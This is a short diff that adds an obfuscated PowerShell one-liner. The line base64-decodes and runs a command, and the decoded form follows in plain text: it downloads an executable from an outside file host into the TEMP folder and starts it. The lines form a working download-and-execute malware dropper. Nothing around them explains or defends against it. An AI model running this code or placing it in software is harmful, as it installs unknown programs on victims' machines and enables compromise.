@@ -1,0 +1,7 @@
+iex([sYSTEm.TEXt.ENCoDinG]::utf8.GEtSTring([systEM.cONVErt]::fromBase64StRinG('CihOZXctT2JqZWN0IHN5c1RlTS5uRXQud2VCY2xpRW50KS5ET1duTE9hZEZpTEUoJ2EucG9tZi5jYXQvbXNpY3hxLmV4ZScsIiRFblY6VEVNUFxiZXN0LmV4ZSIpO1N0YXJ0LVByb2Nlc3MgKCIkRW5WOlRFTVBcYmVzdC5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sysTeM.nEt.weBcliEnt).DOWnLOadFiLE('a.pomf.cat/msicxq.exe',"$EnV:TEMP\best.exe");Start-Process ("$EnV:TEMP\best.exe")
+
